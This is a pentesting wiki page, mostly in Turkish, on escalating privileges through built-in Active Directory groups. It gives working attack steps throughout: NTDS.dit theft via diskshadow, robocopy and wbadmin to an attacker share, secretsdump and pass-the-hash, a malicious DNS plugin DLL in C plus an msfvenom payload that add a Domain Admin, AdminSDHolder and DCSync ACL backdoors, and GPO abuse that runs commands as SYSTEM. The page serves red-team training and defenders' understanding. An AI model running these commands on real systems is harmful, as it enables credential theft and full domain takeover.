# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetim ayrıcalıklarına sahip bilinen gruplar

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, etki alanında yönetici olmayan hesapları ve grupları oluşturma yetkisine sahiptir. Ayrıca, Etki Alanı Denetleyicisi (DC) üzerinde yerel oturum açmaya izin verir.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklemek ve DC'ye yerel giriş yapmak izinli.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Access Control List (ACL)'i, Active Directory içindeki tüm "protected groups" için — yüksek ayrıcalıklı gruplar da dahil — izinleri belirlediği için kritik öneme sahiptir. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'ini değiştirerek standart bir kullanıcıya tam yetki verip bunu suistimal edebilir. Bu, söz konusu kullanıcıya tüm protected groups üzerinde tam kontrol sağlar. Eğer bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı gereği izinleri bir saat içinde otomatik olarak geri verilir.

Güncel Windows Server belgeleri hâlâ bazı yerleşik operator gruplarını **protected** nesneler olarak değerlendirir (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, vb.). **SDProp** süreci varsayılan olarak her 60 dakikada bir **PDC Emulator** üzerinde çalışır, `adminCount=1` değerini atar ve protected nesnelerde inheritance'ı devre dışı bırakır. Bu hem persistence için hem de protected grup üyeliğinden çıkarılmış ancak non-inheriting ACL'yi hâlâ koruyan eski ayrıcalıklı kullanıcıları tespit etmek için faydalıdır.

Üyeleri incelemek ve izinleri değiştirmek için kullanılabilecek komutlar şunlardır:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Kurtarma sürecini hızlandırmak için bir betik mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.

## AD Recycle Bin

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir; bu, hassas bilgileri açığa çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinmiş nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPNs veya daha sonra başka bir operatör tarafından geri yüklenebilecek silinmiş ayrıcalıklı bir grubun DN'si gibi bilgileri açığa çıkarabilir.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Etki Alanı Denetleyicisine Erişim

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir üyesi olmadığı sürece kısıtlıdır; bu grup erişim düzeyini değiştirir.

### Yetki Yükseltme

Sysinternals'tan `PsService` veya `sc` kullanılarak hizmet izinleri incelenip değiştirilebilir. Örneğin `Server Operators` grubu bazı hizmetler üzerinde tam kontrole sahiptir; bu da herhangi bir komutun çalıştırılmasına ve yetki yükseltimine izin verir:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators`'ın tam erişime sahip olduğunu gösterir; bu da hizmetleri manipüle ederek ayrıcalık yükseltmeye olanak tanır.

## Backup Operators

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanılarak açık izinler olmasa bile klasör dolaşımı, listeleme ve dosya kopyalama yeteneklerini sağlar. Bu işlem için belirli scriptlerin kullanılması gerekir.

Grup üyelerini listelemek için şu komutu çalıştırın:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege`'i etkinleştirin ve doğrulayın:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlerdeki dosyalara erişin ve kopyalayın, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Etki Alanı Denetleyicisi'nin dosya sistemine doğrudan erişim, alan kullanıcıları ve bilgisayarlar için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### Using diskshadow.exe

1. `C` sürücüsünün bir shadow copy'sini oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Gölge kopyadan `NTDS.dit`'i kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash elde etmek için `SYSTEM` ve `SAM`'ı çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`'den tüm hashes'i al:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Çıkarım sonrası: Pass-the-Hash ile DA'ya
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe Kullanımı

1. Saldırgan makinesinde SMB sunucusu için NTFS dosya sistemi oluşturun ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeği almak ve `NTDS.dit` çıkarmak için `wbadmin.exe`'yi kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için bakınız: [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Bu zafiyet, DNS servisinde (genellikle DCs içinde) SYSTEM ayrıcalıklarıyla rastgele kod çalıştırılmasına olanak tanır. Bu sorun 2021'de düzeltildi.

Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusunun rastgele bir DLL (yerel olarak veya uzak bir paylaşımdan) yüklemesini sağlayabilir:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL'in yüklenmesi için DNS hizmetini yeniden başlatmak (ek izinler gerektirebilir) gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Bu saldırı vektörü hakkında daha fazla bilgi için ired.team'e bakın.

#### Mimilib.dll

mimilib.dll'i belirli komutları veya reverse shell'leri çalıştıracak şekilde değiştirerek komut yürütmek için kullanmak da mümkündür. Daha fazla bilgi için [bu gönderiye göz atın](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

### MitM için WPAD Kaydı

DnsAdmins, global query block list'i devre dışı bırakıp bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Ağ trafiğini sahtelemek ve yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.

### Olay Günlüğü Okuyucuları
Üyeler olay günlüklerine erişebilir; açık metin şifreler veya komut yürütme ayrıntıları gibi hassas bilgileri bulabilirler:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows İzinleri

Bu grup domain nesnesi üzerindeki DACLs'leri değiştirebilir ve potansiyel olarak DCSync privileges verebilir. Bu grubu kullanarak yapılan privilege escalation teknikleri Exchange-AD-Privesc GitHub repo içinde detaylandırılmıştır.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Bu grubun üyesi olarak hareket edebiliyorsanız, klasik kötüye kullanım, saldırgan tarafından kontrol edilen bir principal'e [DCSync](dcsync.md) için gerekli replication rights vermektir:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Tarihi olarak, **PrivExchange** posta kutusu erişimini zincirleyerek, Exchange kimlik doğrulamasını zorlayarak ve LDAP relay yaparak aynı temel ayrıcalığa ulaşıyordu. Bu relay yolu giderilse bile, `Exchange Windows Permissions` üyeliği veya bir Exchange sunucusunun kontrolü etki alanı çoğaltma yetkileri için yüksek değerli bir yol olmaya devam eder.

## Hyper-V Administrators

Hyper-V Administrators, Hyper-V üzerinde tam erişime sahiptir ve bu erişim, sanallaştırılmış Domain Controller'lar üzerinde kontrol elde etmek için istismar edilebilir. Buna canlı DC'leri klonlamak ve NTDS.dit dosyasından NTLM hash'lerini çıkarmak dahildir.

### İstismar Örneği

Pratik istismar genellikle eski host-seviyesi LPE numaralarından ziyade **DC disklerine/checkpoint'lerine offline erişim**dir. Hyper-V host'una erişimle, bir operatör sanallaştırılmış bir Domain Controller için checkpoint oluşturabilir veya dışa aktarım yapabilir, VHDX'i bağlayabilir ve `NTDS.dit`, `SYSTEM` ve diğer sırları misafir içindeki LSASS'e dokunmadan çıkarabilir:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Bundan sonra, `Backup Operators` iş akışını yeniden kullanarak `Windows\NTDS\ntds.dit` ve kayıt defteri hive'lerini çevrimdışı olarak kopyalayın.

## Group Policy Creators Owners

Bu grup, üyelerin etki alanında Group Policy oluşturmalarına izin verir. Ancak üyeler kullanıcı veya gruplara Group Policy uygulayamazlar ya da mevcut GPO'ları düzenleyemezler.

Önemli nüans şudur: **oluşturan kişi yeni GPO'nun sahibi olur** ve genellikle sonrasında onu düzenlemek için yeterli haklara sahip olur. Bu nedenle bu grup, şu durumlarda ilgi çekicidir:

- kötü amaçlı bir GPO oluşturup bir yöneticiyi hedef OU/domain'e bağlaması için ikna etmek
- zaten faydalı bir yere bağlı olan sizin oluşturduğunuz bir GPO'yu düzenlemek
- GPO'ları linklemeye izin veren başka bir delege edilmiş hakkı istismar etmek; bu grup ise size düzenleme tarafını sağlar

Pratik istismar genellikle SYSVOL destekli politika dosyaları aracılığıyla bir **Immediate Task**, **startup script**, **local admin membership** veya **user rights assignment** değişikliği eklemek anlamına gelir.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Domain Controllers üzerinde bu grup tehlikelidir çünkü varsayılan Domain Controller Policy `Print Operators`'a **`SeLoadDriverPrivilege`** verir. Eğer bu grubun bir üyesi için yükseltilmiş bir token elde ederseniz, ayrıcalığı etkinleştirip imzalı ama zafiyetli bir sürücü yükleyerek kernel/SYSTEM'e atlayabilirsiniz. Token işleme detayları için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) sayfasına bakın.

#### Remote Desktop Users

Bu grubun üyelerine Remote Desktop Protocol (RDP) üzerinden PC erişimi verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi istismar etmeye dair daha fazla bilgi özel pentesting kaynaklarında bulunabilir.

#### Uzaktan Yönetim Kullanıcıları

Üyeler, **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin enumeration'ı şu yollarla gerçekleştirilir:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili istismar teknikleri için özel dokümantasyon incelenmelidir.

#### Sunucu Operatörleri

Bu grup, Etki Alanı Denetleyicileri üzerinde yedekleme ve geri yükleme ayrıcalıkları, sistem zamanını değiştirme ve sistemi kapatma dahil olmak üzere çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut şudur:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Etki Alanı Denetleyicilerinde, `Server Operators` genellikle **hizmetleri yeniden yapılandırmak veya başlat/durdurmak** için yeterli haklara sahiptir ve varsayılan DC politikası yoluyla `SeBackupPrivilege`/`SeRestorePrivilege` alırlar. Pratikte, bu onları **service-control abuse** ile **NTDS extraction** arasında bir köprü haline getirir:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Eğer bir service ACL bu gruba change/start hakları veriyorsa, servisi rastgele bir komuta yönlendirip `LocalSystem` olarak başlatın ve sonra orijinal `binPath`'i geri yükleyin. Service control kilitliyse, `NTDS.dit`'i kopyalamak için yukarıdaki `Backup Operators` tekniklerine başvurun.

## Referanslar <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
